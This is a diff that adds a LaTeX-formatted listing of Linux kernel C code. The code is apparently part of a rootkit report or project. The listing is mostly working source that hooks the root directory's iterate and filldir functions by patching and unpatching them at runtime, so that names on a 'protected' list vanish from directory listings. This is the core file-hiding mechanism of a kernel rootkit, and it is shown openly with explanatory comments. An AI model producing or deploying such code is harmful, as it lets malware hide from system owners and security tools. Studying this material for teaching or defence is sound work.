@@ -1,0 +1,54 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYG{c+cm}{/**}
+\PYG{c+cm}{  * Replacement function for \PYGZdq{}/\PYGZdq{} iterate, which is the successor of readdir for}
+\PYG{c+cm}{  * kernels \PYGZgt{}3.11!}
+\PYG{c+cm}{  *}
+\PYG{c+cm}{  * Invokes our filldir function to manipulate results returned. Afterwards}
+\PYG{c+cm}{  * unpatches iterate and calls it to obtain the real results, which it returns}
+\PYG{c+cm}{  * after re\PYGZhy{}applying our patch to iterate. (So we can continue manipulating}
+\PYG{c+cm}{  * filldir). In short it:}
+\PYG{c+cm}{  *     1). Calls our own filldir to manipulate results.}
+\PYG{c+cm}{  *     2). Unpatches iterate, calls it and saves its return value to maintain}
+\PYG{c+cm}{  *         functionality.}
+\PYG{c+cm}{  *     3). Reapplies patch to iterate so we can intercept next call. Goto 1.}
+\PYG{c+cm}{  *}
+\PYG{c+cm}{  * @return Normal iterate values, unless we detect a protected name, in which}
+\PYG{c+cm}{  * case we return 0.}
+\PYG{c+cm}{  */}
+\PYG{k+kt}{int} \PYG{n+nf}{root\PYGZus{}iterate}\PYG{p}{(}\PYG{k}{struct} \PYG{n}{file} \PYG{o}{*}\PYG{n}{file}\PYG{p}{,} \PYG{k}{struct} \PYG{n}{dir\PYGZus{}context} \PYG{o}{*}\PYG{n}{context}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+    \PYG{n}{original\PYGZus{}root\PYGZus{}filldir} \PYG{o}{=} \PYG{n}{context}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{actor}\PYG{p}{;}
+    \PYG{o}{*}\PYG{p}{((}\PYG{n}{filldir\PYGZus{}t}\PYG{o}{*}\PYG{p}{)}\PYG{o}{\PYGZam{}}\PYG{n}{context}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{actor}\PYG{p}{)} \PYG{o}{=}  \PYG{n}{root\PYGZus{}filldir}\PYG{p}{;}
+
+    \PYG{k+kt}{int} \PYG{p}{(}\PYG{o}{*}\PYG{n}{original\PYGZus{}iterate}\PYG{p}{)(}\PYG{k}{struct} \PYG{n}{file} \PYG{o}{*}\PYG{p}{,} \PYG{k}{struct} \PYG{n}{dir\PYGZus{}context} \PYG{o}{*}\PYG{p}{);}
+    \PYG{n}{original\PYGZus{}iterate} \PYG{o}{=} \PYG{n}{asm\PYGZus{}hook\PYGZus{}unpatch}\PYG{p}{(}\PYG{n}{root\PYGZus{}iterate}\PYG{p}{);}
+    \PYG{k+kt}{int} \PYG{n}{ret} \PYG{o}{=} \PYG{n}{original\PYGZus{}iterate}\PYG{p}{(}\PYG{n}{file}\PYG{p}{,} \PYG{n}{context}\PYG{p}{);}
+    \PYG{n}{asm\PYGZus{}hook\PYGZus{}patch}\PYG{p}{(}\PYG{n}{root\PYGZus{}iterate}\PYG{p}{);}
+
+    \PYG{k}{return} \PYG{n}{ret}\PYG{p}{;}
+\PYG{p}{\PYGZcb{}}
+
+\PYG{c+cm}{/**}
+\PYG{c+cm}{  * Replacement function for \PYGZdq{}/\PYGZdq{} filldir. Checks to see whether any file names}
+\PYG{c+cm}{  * from our global file\PYGZus{}list are within the buffer. If so, we return 0 to}
+\PYG{c+cm}{  * pretend the file does not exist. Otherwise we just pass the arguments to}
+\PYG{c+cm}{  * the original filldir function and return its results to preserve}
+\PYG{c+cm}{  * functionality.}
+\PYG{c+cm}{  *}
+\PYG{c+cm}{  * @return 0 if we detect a \PYGZsq{}protected\PYGZsq{} file name, otherwise returns \PYGZsq{}normal\PYGZsq{}}
+\PYG{c+cm}{  * filldir results with the same parameters.}
+\PYG{c+cm}{  */}
+\PYG{k}{static} \PYG{k+kt}{int} \PYG{n+nf}{root\PYGZus{}filldir}\PYG{p}{(}\PYG{k+kt}{void} \PYG{o}{*} \PYG{n}{context}\PYG{p}{,} \PYG{k}{const} \PYG{k+kt}{char} \PYG{o}{*}\PYG{n}{name}\PYG{p}{,} \PYG{k+kt}{int} \PYG{n}{namelen}\PYG{p}{,} \PYG{n}{loff\PYGZus{}t}
+                        \PYG{n}{offset}\PYG{p}{,} \PYG{n}{u64} \PYG{n}{ino}\PYG{p}{,} \PYG{k+kt}{unsigned} \PYG{k+kt}{int} \PYG{n}{d\PYGZus{}type}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+    \PYG{k}{struct} \PYG{n}{file\PYGZus{}entry} \PYG{o}{*}\PYG{n}{f}\PYG{p}{;}
+
+    \PYG{c+c1}{// If the buffer contains any names within our list, return 0.}
+    \PYG{n}{list\PYGZus{}for\PYGZus{}each\PYGZus{}entry}\PYG{p}{(}\PYG{n}{f}\PYG{p}{,} \PYG{o}{\PYGZam{}}\PYG{n}{file\PYGZus{}list}\PYG{p}{,} \PYG{n}{list}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+        \PYG{k}{if} \PYG{p}{(}\PYG{n}{strcmp}\PYG{p}{(}\PYG{n}{name}\PYG{p}{,} \PYG{n}{f}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{name}\PYG{p}{)} \PYG{o}{==} \PYG{l+m+mi}{0}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+            \PYG{k}{return} \PYG{l+m+mi}{0}\PYG{p}{;}
+        \PYG{p}{\PYGZcb{}}
+    \PYG{p}{\PYGZcb{}}
+
+    \PYG{c+c1}{// Otherwise return \PYGZsq{}normal\PYGZsq{} results.}
+    \PYG{k}{return} \PYG{n}{original\PYGZus{}root\PYGZus{}filldir}\PYG{p}{(}\PYG{n}{context}\PYG{p}{,} \PYG{n}{name}\PYG{p}{,} \PYG{n}{namelen}\PYG{p}{,} \PYG{n}{offset}\PYG{p}{,} \PYG{n}{ino}\PYG{p}{,} \PYG{n}{d\PYGZus{}type}\PYG{p}{);}
+\PYG{p}{\PYGZcb{}}
+\end{Verbatim}
